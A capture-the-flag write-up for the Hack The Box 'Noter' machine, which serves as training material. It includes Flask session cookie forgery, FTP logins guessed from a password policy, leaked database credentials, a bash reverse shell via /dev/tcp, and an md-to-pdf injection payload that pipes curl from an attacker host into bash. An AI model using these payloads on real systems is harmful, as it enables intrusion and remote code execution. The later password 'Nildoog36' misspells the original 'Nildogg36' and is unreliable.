# Noter

## User Flag

### Enumeration

First things first I need to run an Nmap after adding the vhost.

```
nmap 10.10.11.160 -sV -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-13 20:52 MDT
Nmap scan report for noter.htb (10.10.11.160)
Host is up (0.078s latency).
Not shown: 65289 closed ports, 243 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.31 seconds
```

We have open ports on 21, 22, and 5000. 5000 HTB is an http port.

Immediately I registered and logged in to expand my attack surface.

So in my efforts, I ran ffuf to enumerate over diretories while signed in.

```
ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.129.173.105:5000/FUZZ -H "Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.YvhojA.Umm7wzJcMPxx91EndnvoD0w5cmI"

register                [Status: 200, Size: 2646, Words: 523, Lines: 95, Duration: 247ms]
login                   [Status: 200, Size: 1967, Words: 427, Lines: 67, Duration: 277ms]
logout                  [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 234ms]
dashboard               [Status: 200, Size: 2361, Words: 560, Lines: 83, Duration: 220ms]
notes                   [Status: 200, Size: 1703, Words: 388, Lines: 61, Duration: 224ms]
VIP                     [Status: 200, Size: 1742, Words: 398, Lines: 58, Duration: 225ms]
```

The cookie format looks like a JWT format. So we could use flask-unsign to brute force the key.

```
pip3 install flask-unsign[wordlist]
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.YvhojA.Umm7wzJcMPxx91EndnvoD0w5cmI'
[*] Session decodes to: {'logged_in': True, 'username': 'test'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2048): -----BEGIN PRIVATE KEY-----***
[+] Found secret key after 17792 attemptsdfc55-abb1-4
'secret123'
```

Now because we have the key, we can use that to craft a new cookie that is the admin.

```
flask-unsign --sign --cookie "{'logged_in': True, 'username':'admin'}" --secret secret123
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YvhqfQ.j2SHq3dJCGF0GBvuB75J5iD1ptk
```

Now moving forward, let's find some usernames.

Using these two scripts:

* https://github.com/Jayden-Lind/HTB-Noter/blob/main/login.py
* https://github.com/Jayden-Lind/HTB-Noter/blob/main/cookie_flask.py

We are able to find a user named blue. Also one Blue's page, we're able to find a set of credentials for the ftp service:

*blue:blue@Noter!*

## Initial Foothold

Success! We now can login as blue!

```
ftp noter.htb
Connected to noter.htb.
220 (vsFTPd 3.0.3)
Name (noter.htb:jex): blue
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16839|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
226 Directory send OK.
ftp> get policy.pdf
local: policy.pdf remote: policy.pdf
229 Entering Extended Passive Mode (|||63728|)
150 Opening BINARY mode data connection for policy.pdf (12569 bytes).
100% |***************************************************************************************************************| 12569        1.39 MiB/s    00:00 ETA
226 Transfer complete.
12569 bytes received in 00:00 (149.28 KiB/s)
ftp> 
```

I was able to download their policy pdf and now I'm going to give it a look.

It happens to contain password guidelines.

```
Password Policy
Overview
This policy is intended to establish guidelines for effectively creating, maintaining, and protecting passwords at Noter.
Scope
This policy shall apply to all employees, contractors, and affiliates of "Noter", and shall govern acceptable password use on all systems that connect to "Noter"
network or access or store "Noter" data.
Policy
Password Protection
1.2.3.4.5.6.7.Passwords must not be shared with anyone (including coworkers and supervisors), and must not be revealed or sent electronically.
Passwords shall not be written down or physically stored anywhere in the office.
When configuring password, try not to use any words that can be found publicly about yourself.
User IDs and passwords must not be stored in an unencrypted format.
User IDs and passwords must not be scripted to enable automatic login.
“Remember Password” feature on websites and applications should not be used.
All mobile devices that connect to the company network must be secured with a password and/or biometric authentication and must be configured to lock
after 3 minutes of inactivity.
Password Aging
1. User passwords must be changed every [3] months. Previously used passwords may not be reused. (This applies to all your applications)
2. If you have any problem with the timeline you can contact a moderator
Password Creation
1. All user and admin passwords must be at least [8] characters in length. Longer passwords and passphrases are strongly encouraged.
2. Where possible, password dictionaries should be utilized to prevent the use of common and easily cracked passwords.
3. Passwords must be completely unique, and not used for any other system, application, or personal account.
4. Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)
5. Default installation passwords must be changed immediately after installation is complete.
Enforcement
It is the responsibility of the end user to ensure enforcement with the policies above.
If you believe your password may have been compromised, please immediately report the incident to "Noter Team" and change the password.
```

If we look through the guidelines we'll find the default user password is in the format "username@site_name!" which means that ftp_admin's is likely *ftp_admin@Noter!*. 

So now we have a brand new set of credentials:

*ftp_admin:ftp_admin@Noter!*

So let's try cracking open the ftp-admin login.

```
ftp noter.htb
Connected to noter.htb.
220 (vsFTPd 3.0.3)
Name (noter.htb:jex): ftp_admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||13686|)
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
ftp> 
```

Looks like there are two distinct app backups. So I'm going to download them.

It happens to contain a python program.

```
#!/usr/bin/python3
from flask import Flask, render_template, flash, redirect, url_for, abort, session, request, logging, send_file
from flask_mysqldb import MySQL
from wtforms import Form, StringField, TextAreaField, PasswordField, validators
from passlib.hash import sha256_crypt
from functools import wraps
import time
import requests as pyrequest
from html2text import html2text
import markdown
import random, os, subprocess

app = Flask(__name__)

# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'

# init MYSQL
mysql = MySQL(app)


# Index
@app.route('/')
def index():
    return render_template('home.html')


# About
@app.route('/about')
def about():
    return render_template('about.html')

# Check if user logged in
def is_logged_in(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('Unauthorized, Please login', 'danger')
            return redirect(url_for('login'))
    return wrap

# notes
@app.route('/notes')
@is_logged_in
def notes():
    # Create cursor
    cur = mysql.connection.cursor()
    # Get notes
    if check_VIP(session['username']):
        result = cur.execute("SELECT * FROM notes where author= (%s or 'Noter Team')",[session['username']])
    else:
        result = cur.execute("SELECT * FROM notes where author= %s",[session['username']])

    notes = cur.fetchall()

    if result > 0:
        return render_template('notes.html', notes=notes)
    else:
        msg = 'No notes Found'
        return render_template('notes.html', msg=msg)
    # Close connection
    cur.close()


#Single note
@app.route('/note/<string:id>/')
@is_logged_in
def note(id):
    # Create cursor
    cur = mysql.connection.cursor()

    # Get notes
    if check_VIP(session['username']):
        result = cur.execute("SELECT * FROM notes where author= (%s or 'Noter Team') and id = %s",(session['username'], id))
    else:
        result = cur.execute("SELECT * FROM notes where author= %s",[session['username']])

    note = cur.fetchone()
    note['body'] = html2text(note['body'])
    return render_template('note.html', note=note)


# Register Form Class
class RegisterForm(Form):
    name = StringField('Name', [validators.Length(min=1, max=50)])
    username = StringField('Username', [validators.Length(min=3, max=25)])
    email = StringField('Email', [validators.Length(min=6, max=50)])
    password = PasswordField('Password', [
        validators.DataRequired(),
        validators.EqualTo('confirm', message='Passwords do not match')
    ])
    confirm = PasswordField('Confirm Password')


# User Register
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm(request.form)
    if request.method == 'POST' and form.validate():
        name = form.name.data
        email = form.email.data
        username = form.username.data
        password = sha256_crypt.encrypt(str(form.password.data))

        # Create cursor
        cur = mysql.connection.cursor()

        # Execute query
        cur.execute("INSERT INTO users(name, email, username, password) VALUES(%s, %s, %s, %s)", (name, email, username, password))

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        flash('You are now registered and can log in', 'success')

        return redirect(url_for('login'))
    return render_template('register.html', form=form)


# User login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get Form Fields
        username = request.form['username']
        password_candidate = request.form['password']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute("SELECT * FROM users WHERE username = %s", ([username]))

        if result > 0:
            # Get stored hash
            data = cur.fetchone()
            password = data['password']

            # Compare Passwords
            if sha256_crypt.verify(password_candidate, password):
                # Passed
                session['logged_in'] = True
                session['username'] = username

                flash('You are now logged in', 'success')
                return redirect(url_for('dashboard'))
            else:
                error = 'Invalid login'
                return render_template('login.html', error=error)
            # Close connection
            cur.close()
        else:
            error = 'Invalid credentials'
            return render_template('login.html', error=error)

    return render_template('login.html')



# Logout
@app.route('/logout')
@is_logged_in
def logout():
    session.clear()
    flash('You are now logged out', 'success')
    return redirect(url_for('login'))


#Check VIP
def check_VIP(username):
    try:
        cur = mysql.connection.cursor()
        results = cur.execute(""" select username, case when role = "VIP" then True else False end as VIP from users where username = %s """, [username])

        results = cur.fetchone()
        cur.close()

        if len(results) > 0:
            if results['VIP'] == 1:
                return True

        return False

    except Exception as e:
        return render_template('login.html')


# Dashboard
@app.route('/dashboard')
@is_logged_in
def dashboard():


    # Create cursor
    cur = mysql.connection.cursor()

    # Get notes
    #result = cur.execute("SELECT * FROM notes")
    # Show notes only from the user logged in 
    result = cur.execute("SELECT * FROM notes WHERE author = %s",[session['username']])

    notes = cur.fetchall()
    VIP = check_VIP(session['username'])

    if result > 0:
        if VIP:
            return render_template('vip_dashboard.html', notes=notes)

        return render_template('dashboard.html', notes=notes)
    
    else:
        msg = 'No notes Found'

        if VIP:
            return render_template('vip_dashboard.html', msg=msg)

        return render_template('dashboard.html', msg=msg)
    # Close connection
    cur.close()

# parse the URL
def parse_url(url):
    url = url.lower()
    if not url.startswith ("http://" or "https://"):
        return False, "Invalid URL"    

    if not url.endswith('.md'):
            return False, "Invalid file type"

    return True, None


# upgrade to VIP
@app.route('/VIP',methods=['GET'])
@is_logged_in
def upgrade():
    return render_template('upgrade.html')


# note Form Class
class NoteForm(Form):
    title = StringField('Title', [validators.Length(min=1, max=200)])
    body = TextAreaField('Body', [validators.Length(min=30)])


# Add note
@app.route('/add_note', methods=['GET', 'POST'])
@is_logged_in
def add_note():
    form = NoteForm(request.form)
    if request.method == 'POST' and form.validate():
        title = form.title.data
        body = form.body.data
        # Create Cursor
        cur = mysql.connection.cursor()

        # Execute
        cur.execute("INSERT INTO notes(title, body, author,create_date ) VALUES(%s, %s, %s, %s)",(title, body, session['username'], time.ctime()))

        # Commit to DB
        mysql.connection.commit()

        #Close connection
        cur.close()

        flash('note Created', 'success')

        return redirect(url_for('dashboard'))

    return render_template('add_note.html', form=form)


# Edit note
@app.route('/edit_note/<int:id>', methods=['GET', 'POST'])
@is_logged_in
def edit_note(id):
    # Create cursor
    cur = mysql.connection.cursor()

    # Get note by id
    result = cur.execute("SELECT * FROM notes WHERE id = %s AND author = %s", (id, session['username']))

    note = cur.fetchone()
    cur.close()
    # Get form
    form = NoteForm(request.form)

    # Populate note form fields
    form.title.data = note['title']
    form.body.data = note['body']

    if request.method == 'POST' and form.validate():
        title = request.form['title']
        body = request.form['body']

        # Create Cursor
        cur = mysql.connection.cursor()
        app.logger.info(title)
        # Execute
        cur.execute ("UPDATE notes SET title=%s, body=%s WHERE id=%s  AND author = %s",(title, body, id, session['username']))
        # Commit to DB
        mysql.connection.commit()

        #Close connection
        cur.close()

        flash('note Updated', 'success')

        return redirect(url_for('dashboard'))

    return render_template('edit_note.html', form=form)


# Delete note
@app.route('/delete_note/<int:id>', methods=['POST'])
@is_logged_in
def delete_note(id):
    # Create cursor
    cur = mysql.connection.cursor()

    # Execute
    cur.execute("DELETE FROM notes WHERE id = %s AND author= %s",(id, session['username']))

    # Commit to DB
    mysql.connection.commit()

    #Close connection
    cur.close()

    flash('Note deleted', 'success')

    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    app.secret_key='secret123'
    app.run(host="0.0.0.0",debug=False)
```

Inside the SQL Config we can find some creds.

```
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
```

*root:Nildoog36*

### Achieving RCE

Earlier I was able to generate a cookie for blue: eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YvhzXA.jaShmd35LDIRXtYECwhAMz4RnYo

I could also use that to sign in as them and they also have VIP privilages.

I created a quick bash script reverse shell:

```
#! /bin/bash

/bin/bash -l > /dev/tcp/10.10.14.44/4444 0<&1 2>&1
```

Next I followed this guide: https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880

While still signed as blue with that cookie from earlier (YOU HAVE TO BE SIGNED AS BLUE TO DO THIS)

In the URL section (which maintaining the cookie) enter the following payload: http://10.10.14.44/test.md

While doing that, create a test.md file that contains a payload like this:

```
---js\n((require("child_process")).execSync("curl http://10.10.14.44/reverse.sh | bash"))\n---RCE
```

Next start up the python server in the same directory and a netcat listener on the next tab.

```
sudo python -m http.server 80
nc -nvlp 4444
```

And if all goes well you should drop the shell!

```
Listening on 0.0.0.0 4444
Connection received on 10.10.11.160 58790
ls
app.py
misc
templates
```

Now you can find user.txt easily and get the flag!

## Root Flag

Remeber those root creds that we got from earlier? Let's use em!

*root:Nildoog36*
